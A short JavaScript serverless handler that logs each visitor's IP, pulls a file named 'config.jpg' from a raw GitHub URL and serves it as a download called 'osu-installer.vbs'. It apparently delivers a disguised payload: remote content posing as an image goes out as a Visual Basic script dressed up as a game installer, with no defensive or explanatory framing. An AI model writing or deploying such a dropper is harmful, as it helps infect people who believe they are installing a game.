export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             'Unknown IP';

  console.log(`[${new Date().toISOString()}] Download | IP: ${ip}`);

  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.jpg';;

  try {
    const response = await fetch(rawUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="osu-installer.vbs"');
    res.send(buffer);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('error server');
  }
}
